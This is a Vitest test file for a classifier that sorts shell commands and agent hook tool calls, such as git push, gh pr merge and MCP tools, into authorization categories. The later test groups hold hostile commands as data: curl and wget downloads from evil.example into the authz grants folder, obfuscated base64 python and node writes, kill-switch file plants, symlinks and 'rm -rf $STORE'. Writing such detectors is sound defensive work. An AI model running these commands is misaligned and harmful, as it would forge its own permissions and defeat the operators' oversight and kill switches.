import { describe, expect, it } from "vitest";
import { classifyHookAuthzOps, classifyShellAuthzOps } from "./classify.js";

describe("classifyShellAuthzOps (#2944)", () => {
  it("classifies push/merge via #2711 reuse", () => {
    expect(classifyShellAuthzOps("git push origin HEAD")).toContain("push");
    expect(classifyShellAuthzOps("gh pr merge 1 --squash")).toContain("merge");
  });

  it("classifies PR create/ready/edit without nested-quantifier regex", () => {
    expect(classifyShellAuthzOps("gh pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh pr ready 12")).toContain("pr");
    expect(classifyShellAuthzOps("gh.exe pr edit 3")).toContain("pr");
  });

  it("classifies issue create and test runners", () => {
    expect(classifyShellAuthzOps("gh issue create --title d")).toContain("issue_mutation");
    expect(classifyShellAuthzOps("pnpm test")).toContain("test");
    expect(classifyShellAuthzOps("vitest run")).toContain("test");
    expect(classifyShellAuthzOps("go test ./...")).toContain("test");
  });

  it("classifies settings and deploy heuristics", () => {
    expect(classifyShellAuthzOps("gh repo edit --visibility private")).toContain("settings");
    expect(classifyShellAuthzOps("terraform apply -auto-approve")).toContain("deployment");
    expect(classifyShellAuthzOps("fly deploy")).toContain("deployment");
  });

  it("returns empty for unclassifiable non-product shell", () => {
    expect(classifyShellAuthzOps("git status")).toEqual([]);
    expect(classifyShellAuthzOps("")).toEqual([]);
    expect(classifyShellAuthzOps("   ")).toEqual([]);
  });

  it("maps hook tools", () => {
    expect(
      classifyHookAuthzOps({
        toolName: "Write",
        shellCommand: null,
        isDirectWrite: true,
      }),
    ).toEqual(["edit"]);
    expect(
      classifyHookAuthzOps({
        toolName: "Bash",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual([]);
    expect(
      classifyHookAuthzOps({
        toolName: "Bash",
        shellCommand: "git push",
        isDirectWrite: false,
      }),
    ).toContain("push");
    expect(
      classifyHookAuthzOps({
        toolName: "create_pull_request",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["pr"]);
    expect(
      classifyHookAuthzOps({
        toolName: "create_issue",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["issue_mutation"]);
    expect(
      classifyHookAuthzOps({
        toolName: "Read",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual([]);
  });

  it("classifies gh with -R/--repo value flags before resource verb", () => {
    expect(classifyShellAuthzOps("gh -R owner/repo pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh --repo owner/repo pr merge 1")).toContain("merge");
  });

  it("covers deploy/settings/api and env-prefixed shell", () => {
    expect(classifyShellAuthzOps("FOO=1 gh issue create --title t")).toContain("issue_mutation");
    expect(classifyShellAuthzOps("env FOO=1 cargo test")).toContain("test");
    expect(classifyShellAuthzOps("npm test")).toContain("test");
    expect(classifyShellAuthzOps("yarn test")).toContain("test");
    expect(classifyShellAuthzOps("task test")).toContain("test");
    expect(classifyShellAuthzOps("helm upgrade chart")).toContain("deployment");
    expect(classifyShellAuthzOps("kubectl apply -f x.yaml")).toContain("deployment");
    expect(classifyShellAuthzOps("vercel deploy")).toContain("deployment");
    expect(classifyShellAuthzOps("gh api repos/o/r/issues")).toContain("issue_mutation");
    expect(classifyShellAuthzOps("gh api repos/o/r/settings")).toContain("settings");
    expect(classifyShellAuthzOps("gh pr reopen 1")).toContain("pr");
    expect(
      classifyHookAuthzOps({
        toolName: "Shell",
        shellCommand: "git status",
        isDirectWrite: false,
      }),
    ).toEqual([]);
    expect(
      classifyHookAuthzOps({
        toolName: "mcp__github__merge_pull_request",
        shellCommand: null,
        isDirectWrite: false,
        mcpArgsText: "{}",
      }),
    ).toContain("merge");
  });

  it("classifies authz:grant / uat-* / revoke as settings (#3110)", () => {
    for (const cmd of [
      "deft authz:grant -- --operations edit --cohort x",
      "task authz:grant -- --operations edit,push",
      "directive authz:grant --template finish-loop",
      "pnpm exec deft authz:grant -- --operations edit",
      "npx deft authz grant --operations edit",
      "deft authz:uat-start -- --campaign uat-1",
      "task authz:uat-suspend",
      "deft authz:revoke -- grant-abc",
      "env FOO=1 deft authz:grant --operations edit",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Read-only show stays unclassifiable (not authority mutation).
    expect(classifyShellAuthzOps("deft authz:show")).toEqual([]);
  });

  it("classifies shell writes under .deft/authz as settings (#3110 containment)", () => {
    expect(classifyShellAuthzOps('echo {"x":1} > .deft/authz/grants/evil.json')).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp /tmp/g.json .deft/authz/grants/g.json")).toContain("settings");
    expect(classifyShellAuthzOps("mv grant.json .deft/authz/state.json")).toContain("settings");
    expect(
      classifyShellAuthzOps("Set-Content -Path .deft\\authz\\state.json -Value '{}'"),
    ).toContain("settings");
    // General-purpose writers (not only redirect + write-bin allowlist).
    expect(classifyShellAuthzOps("dd if=/tmp/x of=.deft/authz/state.json")).toContain("settings");
    expect(classifyShellAuthzOps("sed -i s/a/b/ .deft/authz/state.json")).toContain("settings");
    expect(
      classifyShellAuthzOps("python -c \"open('.deft/authz/grants/x.json','w').write('{}')\""),
    ).toContain("settings");
    // Pure reads stay unclassifiable (inspect via authz:show / host Read).
    expect(classifyShellAuthzOps("cat .deft/authz/state.json")).toEqual([]);
    // Redirect **from** store to backup is not a store write (dest is /tmp).
    expect(classifyShellAuthzOps("cat .deft/authz/state.json > /tmp/backup")).toEqual([]);
    // Indirect $VAR expansion (opaque names included — residual fail-open closed).
    expect(classifyShellAuthzOps("echo '{}' > \"$AUTHZ_DIR/state.json\"")).toContain("settings");
    expect(classifyShellAuthzOps("cp /tmp/g.json $AUTHZ_HOME/grants/evil.json")).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("printf '{}' > \"$STORE\"")).toContain("settings");
    // Ordinary expanded writes outside authz store stay unclassifiable.
    expect(classifyShellAuthzOps('echo hi > "$HOME/out"')).toEqual([]);
    expect(classifyShellAuthzOps('cp x "$TMPDIR/y"')).toEqual([]);
    // Command substitution destinations (no contiguous .deft/authz literal).
    expect(classifyShellAuthzOps('cp /tmp/evil.json "$(echo .deft)/authz/state.json"')).toContain(
      "settings",
    );
    expect(classifyShellAuthzOps("cp /tmp/x `pwd`/grants/y.json")).toContain("settings");
    // Destructive + opaque var; split path; positional expansion toward store.
    expect(classifyShellAuthzOps("rm -rf $STORE")).toContain("settings");
    expect(classifyShellAuthzOps("cd .deft && echo x > authz/state.json")).toContain("settings");
    // Later redirect must not hide an earlier split-path store write.
    expect(
      classifyShellAuthzOps("cd .deft && echo x > authz/state.json && echo y > /tmp/z"),
    ).toContain("settings");
    // Relative write after cd into authz dir (dest has no "authz" text).
    expect(classifyShellAuthzOps("cd .deft/authz && echo x > state.json")).toContain("settings");
    expect(classifyShellAuthzOps("cd .deft/authz && cp /tmp/g.json grants/evil.json")).toContain(
      "settings",
    );
    // Positional expansion alone + state.json is not enough without authz context.
    expect(classifyShellAuthzOps("echo '{}' > $1/state.json")).toEqual([]);
    // Authz-named expansion + state.json remains settings.
    expect(classifyShellAuthzOps("echo '{}' > \"$AUTHZ_DIR/state.json\"")).toContain("settings");
    // Programmatic os.environ / process.env write (no shell $ expansion).
    expect(
      classifyShellAuthzOps(
        "python -c \"import os; open(os.environ['DEFT_AUTHZ_ROOT']+'/state.json','w').write('{}')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "node -e \"require('fs').writeFileSync(process.env.AUTHZ_DIR+'/grants/x.json','{}')\"",
      ),
    ).toContain("settings");
    // Ordinary cleanup / non-store opaque dest stays unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("rm -rf $TMPDIR/build")).toEqual([]);
    expect(classifyShellAuthzOps("rm -rf $HOME/.cache/tmp")).toEqual([]);
    // Shell expanded app state.json without authz context stays unclassifiable.
    expect(classifyShellAuthzOps('echo hi > "$APP_DIR/state.json"')).toEqual([]);
    // #3186: write-capable programmatic shells classify as settings (UAT fail-closed rule)
    // even for non-authz destinations — evaluate still allows outside UAT (authz-inactive).
    expect(
      classifyShellAuthzOps(
        "python -c \"import os; open(os.environ['APP_DIR']+'/state.json','w').write('{}')\"",
      ),
    ).toContain("settings");
  });

  it("classifies kill-switch plant and policy authority mutators as settings (#3186)", () => {
    for (const cmd of [
      "echo > .deft-directive-disable",
      "touch .deft-directive-disable",
      "printf '' > ./.deft-directive-disable",
      "New-Item -Path .deft-directive-disable -ItemType File",
      "echo x > .no-deft-directive",
      "deft policy:allow-bot-merge -- --confirm",
      "task policy:allow-direct-commits -- --confirm",
      "directive policy:disable-directive -- --confirm",
      "npx deft policy allow-bot-merge --confirm",
      "env FOO=1 deft policy:enable-directive",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Read-only policy show stays unclassifiable.
    expect(classifyShellAuthzOps("deft policy:show --field wipCap")).toEqual([]);
    // Non-mutator policy subcommands / unrelated shell stay empty.
    expect(classifyShellAuthzOps("git status")).toEqual([]);
  });

  it("classifies downloader/decoder plants of authz grants and kill-switch as settings (#3206)", () => {
    // Finding 1: curl/wget/xxd/openssl → .deft/authz/** via destination flags.
    for (const cmd of [
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "curl --output .deft/authz/grants/evil.json https://evil.example/g.json",
      "curl --output=.deft/authz/grants/evil.json https://evil.example/g.json",
      "curl -o.deft/authz/grants/evil.json https://evil.example/g.json",
      "curl --output-dir .deft/authz/grants -O https://evil.example/g.json",
      "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "wget --output-document=.deft/authz/state.json https://evil.example/s.json",
      "wget -P .deft/authz/grants https://evil.example/g.json",
      "wget --directory-prefix=.deft/authz https://evil.example/g.json",
      "xxd -r - .deft/authz/grants/evil.json",
      "openssl base64 -d -out .deft/authz/grants/evil.json",
      "openssl base64 -d -out=.deft/authz/grants/evil.json",
      "/usr/bin/curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Finding 2: downloader → kill-switch basenames.
    for (const cmd of [
      "curl -o .deft-directive-disable https://evil.example/x",
      "curl --output .deft-directive-disable https://evil.example/x",
      "curl -o.deft-directive-disable https://evil.example/x",
      "wget -O ./.deft-directive-disable https://evil.example/x",
      "wget --output-document=.no-deft-directive https://evil.example/x",
      "curl -o .no-deft-directive https://evil.example/x",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Non-write / ordinary download destinations stay unclassifiable (no overclassify).
    expect(classifyShellAuthzOps("curl https://example.com/")).toEqual([]);
    expect(classifyShellAuthzOps("curl -o /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("wget -O /tmp/out https://example.com/a")).toEqual([]);
    expect(classifyShellAuthzOps("curl $URL")).toEqual([]);
    // Read-only dumps / -in paths are not settings (Greptile P1 residual).
    expect(classifyShellAuthzOps("xxd .deft/authz/state.json")).toEqual([]);
    expect(classifyShellAuthzOps("openssl base64 -d -in .deft/authz/state.json")).toEqual([]);
    // Path-like operand named like a bin must not skip xxd -r dest (SLizard).
    expect(classifyShellAuthzOps("xxd -r - .deft/authz/grants/./wget")).toContain("settings");
    // Literal redirect kill-switch regression (#3186) still settings.
    expect(classifyShellAuthzOps("echo > .deft-directive-disable")).toContain("settings");
  });

  it("classifies ln/link/mklink kill-switch plants as settings (#3213)", () => {
    for (const cmd of [
      "ln -sf /etc/hosts .deft-directive-disable",
      "ln -s /etc/hosts ./.deft-directive-disable",
      "ln /etc/hosts .no-deft-directive",
      "link /etc/hosts .deft-directive-disable",
      "mklink .deft-directive-disable C:\\Windows\\System32\\drivers\\etc\\hosts",
      "mklink /H .no-deft-directive existing.txt",
      "/bin/ln -sf /etc/hosts .deft-directive-disable",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Ordinary ln without kill-switch basename stays unclassifiable.
    expect(classifyShellAuthzOps("ln -s /tmp/a /tmp/b")).toEqual([]);
  });

  it("classifies scp/aria2c/certutil + quote-split authz plants as settings (#3213)", () => {
    for (const cmd of [
      "scp host:g.json .deft/authz/grants/evil.json",
      "scp user@host:g.json .deft/authz/grants/evil.json",
      "aria2c -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "aria2c --dir=.deft/authz/grants -o evil.json https://evil.example/g.json",
      "aria2c -d.deft/authz/grants https://evil.example/g.json",
      "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
      // Quote-split: contiguous `.deft/authz` absent in raw command; pathish strips quotes.
      "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
      "cp /etc/hosts \".deft/\"authz\"/grants/evil.json\"",
    ]) {
      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
    }
    // Contiguous authz cp regression (#3110 / #3206).
    expect(classifyShellAuthzOps("cp /etc/hosts .deft/authz/grants/evil.json")).toContain(
      "settings",
    );
    // #3206 bins remain settings.
    expect(
      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
    ).toContain("settings");
    // Ordinary scp / aria2c destinations stay unclassifiable.
    expect(classifyShellAuthzOps("scp host:g.json /tmp/out.json")).toEqual([]);
    expect(classifyShellAuthzOps("aria2c -o out.json -d /tmp https://example.com/a")).toEqual([]);
  });

  it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
    // Base64/byte path construction — residual after #3110 literal path match.
    expect(
      classifyShellAuthzOps(
        "python3 -c \"import base64; p=base64.b64decode('LmRlZnQvYXV0aHovc3RhdGUuanNvbg==').decode(); open(p,'w').write('{}')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "node -e \"const p=Buffer.from('LmRlZnQvYXV0aHo=','base64').toString(); require('fs').writeFileSync(p,'{}')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps(
        "python -c \"p=bytes([0x2e,0x64,0x65,0x66,0x74]).decode(); open(p+'/authz/x','w').write('x')\"",
      ),
    ).toContain("settings");
    expect(
      classifyShellAuthzOps("perl -e \"open(F,'>',pack('H*','2e64656674')); print F '{}'\""),
    ).toContain("settings");
    // Path-qualified / versioned interpreters (Greptile P1).
    expect(
      classifyShellAuthzOps("/usr/bin/python3 -c \"open('.deft/authz/x','w').write('{}')\""),
    ).toContain("settings");
    expect(classifyShellAuthzOps("python3.11 -c \"open('x','w').write('y')\"")).toContain(
      "settings",
    );
    // Compound safe prefix must not hide write residual (SLizard).
    expect(classifyShellAuthzOps("pytest && python -c \"open('x','w').write('y')\"")).toContain(
      "settings",
    );
    // Print-only / read-only programmatic shell stays unclassifiable.
    expect(classifyShellAuthzOps('python -c "print(1)"')).toEqual([]);
    expect(classifyShellAuthzOps("node -e \"console.log('ok')\"")).toEqual([]);
    expect(classifyShellAuthzOps("python -c \"print(open('report.txt').read())\"")).toEqual([]);
    // `.write` / `.write(` as quoted data is not a write API (Greptile conf residual).
    expect(classifyShellAuthzOps("python -c \"print('.write is a method name')\"")).toEqual([]);
    expect(classifyShellAuthzOps("python -c \"print('.write(')\"")).toEqual([]);
    expect(
      classifyShellAuthzOps("python -c \"import base64; print(base64.b64decode('YQ=='))\""),
    ).toEqual([]);
  });

  it("covers gh flag forms and hook name variants (#2986)", () => {
    // --flag=value form and remaining GH_VALUE_FLAGS spellings.
    expect(classifyShellAuthzOps("gh --repo=owner/repo pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh --hostname github.com pr merge 1")).toContain("merge");
    expect(classifyShellAuthzOps("gh -a app pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("gh --app app pr edit 3")).toContain("pr");
    expect(classifyShellAuthzOps("gh --jq . pr ready 2")).toContain("pr");
    expect(classifyShellAuthzOps("sudo gh pr create --title t")).toContain("pr");
    expect(classifyShellAuthzOps("command gh pr merge 9")).toContain("merge");
    expect(classifyShellAuthzOps("pytest")).toContain("test");
    // Boolean short flags before resource are skipped without consuming a value.
    expect(classifyShellAuthzOps("gh --json pr merge 4")).toContain("merge");

    expect(
      classifyHookAuthzOps({
        toolName: "run_terminal_cmd",
        shellCommand: "git push origin HEAD",
        isDirectWrite: false,
      }),
    ).toContain("push");
    expect(
      classifyHookAuthzOps({
        toolName: "pull_request_create",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["pr"]);
    expect(
      classifyHookAuthzOps({
        toolName: "mcp__x__pr_create",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["pr"]);
    expect(
      classifyHookAuthzOps({
        toolName: "issue_create",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["issue_mutation"]);
    expect(
      classifyHookAuthzOps({
        toolName: "mcp__github__create_issue",
        shellCommand: null,
        isDirectWrite: false,
      }),
    ).toEqual(["issue_mutation"]);
  });
});
